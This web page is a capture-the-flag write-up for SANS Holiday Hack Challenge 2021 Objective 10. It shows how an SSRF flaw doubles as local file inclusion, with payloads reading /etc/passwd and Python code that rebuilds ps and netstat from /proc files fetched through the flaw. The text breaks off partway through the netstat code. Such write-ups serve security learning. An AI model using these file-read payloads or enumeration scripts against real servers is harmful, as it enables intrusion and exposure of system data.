
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Joe Ammond (pugpug)">
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.4">
    
    
      
        <title>Reverse Engineering the Application Environment - SANS HHC 2021 writeup, Objective 10 (Now Hiring!)</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.bb3983ee.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.e6a45f82.min.css">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../css/print.css">
    
    <script>__md_scope=new URL("..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="none" data-md-color-accent="none">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#reverse-engineering-the-application-environment" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" class="md-header__button md-logo" aria-label="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS HHC 2021 writeup, Objective 10 (Now Hiring!)
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Reverse Engineering the Application Environment
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" class="md-nav__button md-logo" aria-label="SANS HHC 2021 writeup, Objective 10 (Now Hiring!)" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>

    </a>
    SANS HHC 2021 writeup, Objective 10 (Now Hiring!)
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="https://ammond.org" class="md-nav__link">
        Home
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        Introduction
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../solution/" class="md-nav__link">
        Solution
      </a>
    </li>
  

    
      
      
      

  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Reverse Engineering the Application Environment
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Reverse Engineering the Application Environment
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ssrf-is-in-this-app-also-lfi" class="md-nav__link">
    SSRF is (in This App) Also LFI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fetching-a-process-listing" class="md-nav__link">
    Fetching a Process Listing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#replicating-netstat" class="md-nav__link">
    Replicating netstat
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#identifying-the-container-distribution" class="md-nav__link">
    Identifying the Container Distribution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerating-alpine-packages" class="md-nav__link">
    Enumerating Alpine Packages
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#service-configuration-files" class="md-nav__link">
    Service Configuration Files
  </a>
  
    <nav class="md-nav" aria-label="Service Configuration Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#supervisordconf-and-startup-scripts" class="md-nav__link">
    supervisord.conf and Startup Scripts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginxconf" class="md-nav__link">
    nginx.conf
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-configuration" class="md-nav__link">
    PHP Configuration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ec2-metadata-service-configuration" class="md-nav__link">
    EC2 Metadata Service Configuration
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-files" class="md-nav__link">
    Application Files
  </a>
  
    <nav class="md-nav" aria-label="Application Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-application-files" class="md-nav__link">
    Web Application File(s)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ec2-metadata-binary" class="md-nav__link">
    ec2-metadata Binary
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#building-the-container" class="md-nav__link">
    Building the Container
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../rce/" class="md-nav__link">
        LFI to RCE... maybe?
      </a>
    </li>
  

    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../conclusion/" class="md-nav__link">
        Conclustion
      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#ssrf-is-in-this-app-also-lfi" class="md-nav__link">
    SSRF is (in This App) Also LFI
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fetching-a-process-listing" class="md-nav__link">
    Fetching a Process Listing
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#replicating-netstat" class="md-nav__link">
    Replicating netstat
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#identifying-the-container-distribution" class="md-nav__link">
    Identifying the Container Distribution
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumerating-alpine-packages" class="md-nav__link">
    Enumerating Alpine Packages
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#service-configuration-files" class="md-nav__link">
    Service Configuration Files
  </a>
  
    <nav class="md-nav" aria-label="Service Configuration Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#supervisordconf-and-startup-scripts" class="md-nav__link">
    supervisord.conf and Startup Scripts
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#nginxconf" class="md-nav__link">
    nginx.conf
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#php-configuration" class="md-nav__link">
    PHP Configuration
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ec2-metadata-service-configuration" class="md-nav__link">
    EC2 Metadata Service Configuration
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#application-files" class="md-nav__link">
    Application Files
  </a>
  
    <nav class="md-nav" aria-label="Application Files">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-application-files" class="md-nav__link">
    Web Application File(s)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ec2-metadata-binary" class="md-nav__link">
    ec2-metadata Binary
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#building-the-container" class="md-nav__link">
    Building the Container
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
                

<h1 id="reverse-engineering-the-application-environment">Reverse Engineering the Application Environment<a class="headerlink" href="#reverse-engineering-the-application-environment" title="Permanent link">#</a></h1>
<p>After completing all the objectives and sending Jack home with the Trolls, I wanted
to see how much information about the underlying system the web application was
running on. The answer is, quite a lot, enough to reverse engineer the system to
duplicate it on my local machine.</p>
<h2 id="ssrf-is-in-this-app-also-lfi">SSRF is (in This App) Also LFI<a class="headerlink" href="#ssrf-is-in-this-app-also-lfi" title="Permanent link">#</a></h2>
<p>After trying some different payloads from
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a>, I 
attempted a payload containing a <code>file://</code> resource to attempt to read a file
from the filesystem. To my surprise, it worked:</p>
<div class="highlight"><pre><span></span><code><span class="gp">$ </span>python apply-ssrf.py
<span class="go">ssrf&gt; file:///etc/passwd</span>
<span class="go">root:x:0:0:root:/root:/bin/ash</span>
<span class="go">bin:x:1:1:bin:/bin:/sbin/nologin</span>
<span class="go">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span>
<span class="go">adm:x:3:4:adm:/var/adm:/sbin/nologin</span>
<span class="go">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
<span class="go">sync:x:5:0:sync:/sbin:/bin/sync</span>
<span class="go">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span>
<span class="go">halt:x:7:0:halt:/sbin:/sbin/halt</span>
<span class="go">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span>
<span class="go">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span>
<span class="go">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span>
<span class="go">operator:x:11:0:operator:/root:/sbin/nologin</span>
<span class="go">...</span>
</code></pre></div>
<p>Trying without the <code>file://</code> also worked:</p>
<div class="highlight"><pre><span></span><code><span class="go">ssrf&gt; /etc/passwd</span>
<span class="go">root:x:0:0:root:/root:/bin/ash</span>
<span class="go">bin:x:1:1:bin:/bin:/sbin/nologin</span>
<span class="go">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span>
<span class="go">adm:x:3:4:adm:/var/adm:/sbin/nologin</span>
<span class="go">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span>
<span class="go">sync:x:5:0:sync:/sbin:/bin/sync</span>
<span class="go">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span>
<span class="go">halt:x:7:0:halt:/sbin:/sbin/halt</span>
<span class="go">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span>
<span class="go">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span>
<span class="go">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span>
<span class="go">operator:x:11:0:operator:/root:/sbin/nologin</span>
<span class="go">...</span>
</code></pre></div>
<p>In this application, the SSRF vulnerability also allows
an attacker to read local files, known as a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion">Local File
Inclusion (LFI)</a>
exploit. In certain situations, LFI vulnerabilities can be leveraged by an 
attacker to gain <a href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Remote Code Execution</a>
on the server, leading to much greater compromise. </p>
<p>In this case, we are able to learn enough about the system the web app is running on 
to re-create it in a docker container, which we can run on our local environment. 
Running the application locally allows us to more easily understand how the application
works, as we can see any logs generated by the services running and the application itself.
While the process of understanding how the application works is much simpler if the
attacker is able to execute code or commands on the system, just having the ability
to read local files can emulate the commands an attacker may run through an RCE 
vulnerability. With some knowledge of how the Linux <code>/proc</code> filesystem is laid out and
some simple Python scripting, we can produce a process list and open network connections
without access to commands such as <code>ps</code> and <code>netstat</code>.</p>
<h2 id="fetching-a-process-listing">Fetching a Process Listing<a class="headerlink" href="#fetching-a-process-listing" title="Permanent link">#</a></h2>
<p>The Linux <code>/proc</code> virtual filesystem provides an interface into data structures
in the Linux kernel. Each process in the system is represented by a directory
<code>/proc/[PID]</code>, containing files with information about the process. Depending
on <a href="https://man7.org/linux/man-pages/man5/proc.5.html">how <code>/proc</code> is mounted</a>, it
is possible to read information about every process on the system. Two files under
<code>/proc/[pid]</code> give us the information we need to build a basic process listing: 
<code>/proc/[pid]/status</code> and <code>/proc/[pid]/cmdline</code>. Using a loop, we can create a rudimentary
version of <code>ps</code> and enumerate the processes on the system.</p>
<p>We start by adding the following functions to the <code>ssrf.py</code> script. First, we define a
helper function to pull <code>/etc/passwd</code> and create a mapping of <code>UID</code> to <code>username</code>:</p>
<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">fetch_users</span><span class="p">():</span>
    <span class="n">users</span> <span class="o">=</span> <span class="p">{}</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">passwd</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
        <span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
        <span class="n">users</span><span class="p">[</span><span class="n">user</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">users</span>
</code></pre></div>
<p>Python has a <code>pwd</code> module for <a href="https://docs.python.org/3/library/pwd.html">accessing the password
database</a>, but there's no way
to tell it to read from a different <code>passwd</code> file. We really only care about
mapping <code>UIDs</code> to <code>usernames</code>.</p>
<p>The main part of the <code>ps</code> replacement is a function added to the <code>Cmd</code> class we've
defined:</p>
<div class="highlight"><pre><span></span><code>    <span class="k">def</span> <span class="nf">do_ps</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="sd">&#39;&#39;&#39;Print a list of processes, only reading files from /proc/[pid]&#39;&#39;&#39;</span>

        <span class="c1"># If we&#39;re passed an argument, use that as the number of processes</span>
        <span class="c1"># to dump, otherwise default to 200.</span>
        <span class="k">if</span> <span class="n">args</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
            <span class="n">pid_max</span> <span class="o">=</span> <span class="mi">200</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">pid_max</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>

        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{:&lt;8}{:&gt;5}{:&gt;5}</span><span class="s1"> </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;UID&#39;</span><span class="p">,</span> <span class="s1">&#39;PID&#39;</span><span class="p">,</span> <span class="s1">&#39;PPID&#39;</span><span class="p">,</span> <span class="s1">&#39;CMD&#39;</span><span class="p">))</span>

        <span class="c1"># Fetch the UID -&gt; username mapping data</span>
        <span class="n">users</span> <span class="o">=</span> <span class="n">fetch_users</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pid_max</span><span class="p">):</span>
            <span class="n">cmdline</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s2">/cmdline&quot;</span><span class="p">)</span>

            <span class="c1"># If /proc/[pid]/cmdline has data, pull /proc/[pid]/status for</span>
            <span class="c1"># further information. /proc/[pid]/stat has a more parseable</span>
            <span class="c1"># form, but doesn&#39;t include the UID data.</span>
            <span class="k">if</span> <span class="n">cmdline</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
                <span class="c1"># cmdline is NULL separated</span>
                <span class="n">cmdline</span> <span class="o">=</span> <span class="n">cmdline</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span><span class="p">)</span>

                <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">fetch</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;/proc/</span><span class="si">{</span><span class="n">pid</span><span class="si">}</span><span class="s2">/status&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
                    <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
                    <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;PPid:&#39;</span><span class="p">:</span>
                        <span class="n">ppid</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                    <span class="k">elif</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;Uid:&#39;</span><span class="p">:</span>
                        <span class="n">uid</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">users</span><span class="p">[</span><span class="n">uid</span><span class="p">]</span><span class="si">:</span><span class="s1">&lt;8</span><span class="si">}{</span><span class="n">pid</span><span class="si">:</span><span class="s1">&gt;5</span><span class="si">}{</span><span class="n">ppid</span><span class="si">:</span><span class="s1">&gt;5</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="n">cmdline</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">()</span>
</code></pre></div>
<p>Running this against the website returns a picture of the system environment:</p>
<div class="highlight"><pre><span></span><code><span class="go">ssrf&gt; ps</span>
<span class="go">UID       PID PPID CMD</span>
<span class="go">root        1    0 /usr/bin/python2 /usr/bin/supervisord -c /etc/supervisor/conf.d/supervisord.conf</span>
<span class="go">root        8    1 /bin/sh /opt/gonginx.sh</span>
<span class="go">root        9    1 php-fpm: master process (/etc/php7/php-fpm.conf)</span>
<span class="go">root       14    1 /bin/sh /opt/imds/imds.sh</span>
<span class="go">root       22    8 nginx: master process nginx -g daemon off;</span>
<span class="go">root       24   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">nginx      25   22 nginx: worker process</span>
<span class="go">root       26   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       27   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       28   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       29   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       32   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">root       36   14 /opt/imds/ec2-metadata -c /opt/imds/config.json</span>
<span class="go">nobody    118    9 php-fpm: pool www</span>
<span class="go">nobody    119    9 php-fpm: pool www</span>
<span class="go">nobody    120    9 php-fpm: pool www</span>

<span class="go">ssrf&gt;</span>
</code></pre></div>
<p>From this list, we know a number of things:</p>
<ul>
<li>The system is using <a href="http://supervisord.org/"><code>supervisord</code></a> as it's
<code>init</code> process instead of a full control system such as <code>systemd</code> or
<code>/sbin/init</code>. <code>supervisord</code> is typically used in containers to keep the
resource usage small.</li>
<li>The web server is <a href="https://nginx.org/"><code>nginx</code></a>, with <a href="https://www.php.net/">PHP</a> support provided by <a href="https://www.php.net/manual/en/install.fpm.php">PHP-FPM</a></li>
<li>There is an interesting process: <code>/opt/imds/ec2-metadata</code>. From the name, this is
probably providing a simulated AWS meta-data service.</li>
<li>We also now have some config files to pull from the server: <code>/opt/gonginx.sh</code>, <code>/opt/imds/imds.sh</code>, <code>/opt/imds/config.json</code>, <code>/etc/php7/php-fpm.conf</code>, and <code>supervisord.conf</code></li>
</ul>
<h2 id="replicating-netstat">Replicating <code>netstat</code><a class="headerlink" href="#replicating-netstat" title="Permanent link">#</a></h2>
<p>Another source of information about the environment are the <code>netstat</code> or <code>ss</code> commands,
which display information about network connections. By reading and processing 
the file <code>/proc/net/tcp</code>, we can display information about <code>TCP</code> connections. </p>
<p>We start by defining a structure for parsing state information about the <code>TCP</code>
sockets, and a helper function for converting the hexadecimal address format to
an <code>IPv4</code> address.</p>
<div class="highlight"><pre><span></span><code><span class="n">tcp_states</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;01&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_ESTABLISHED&#39;</span><span class="p">,</span>
    <span class="s1">&#39;02&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_SYN_SENT&#39;</span><span class="p">,</span>
    <span class="s1">&#39;03&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_SYN_RECV&#39;</span><span class="p">,</span>
    <span class="s1">&#39;04&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_FIN_WAIT1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;05&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_FIN_WAIT2&#39;</span><span class="p">,</span>
    <span class="s1">&#39;06&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_TIME_WAIT&#39;</span><span class="p">,</span>
    <span class="s1">&#39;07&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_CLOSE&#39;</span><span class="p">,</span>
    <span class="s1">&#39;08&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_CLOSE_WAIT&#39;</span><span class="p">,</span>
    <span class="s1">&#39;09&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_LAST_ACK&#39;</span><span class="p">,</span>
    <span class="s1">&#39;0A&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_LISTEN&#39;</span><span class="p">,</span>
    <span class="s1">&#39;0B&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_CLOSING&#39;</span><span class="p">,</span>
    <span class="s1">&#39;0C&#39;</span><span class="p">:</span> <span class="s1">&#39;TCP_NEW_SYN_RECV&#39;</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">hex_to_dec</span><span class="p">(</span><span class="n">hexstring</span><span class="p">):</span>
    <span class="nb">bytes</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="o">*</span><span class="p">[</span><span class="nb">iter</span><span class="p">(</span><span class="n">hexstring</span><span class="p">)]</span><span class="o">*</span><span class="mi">2</span><span class="p">)]</span>
    <span class="nb">bytes</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">bytes</span><span class="p">]</span>
    <span class="k">return</span> <span class="s2">&quot;.&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">bytes</span><span class="p">))</span>
</code></pre></div>
<p>We then add a function to the <code>Cmd</code> class to fetch <code>/proc/net/tcp</code> and parse through
each line:</p>
<div class="highlight"><pre><span></span><code>    <span class="k">def</span> <span class="nf">do_netstat</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
        <span class="sd">&#39;&#39;&#39;Parse /proc/net/tcp and display in netstat format&#39;&#39;&#39;</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{:&lt;24}{:&lt;24}{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;Local Address&#39;</span><span class="p">,</span><span class="s1">&#39;Remote Address&#39;</span><span class="p">,</span><span class="s1">&#39;State&#39;</span><span class="p">))</span>

        <span class="n">netstat_data</span> <span class="o">=</span> <span class="n">fetch</span><span class="p">(</span><span class="s1">&#39;/proc/net/tcp&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">netstat_data</span><span class="p">:</span>
            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

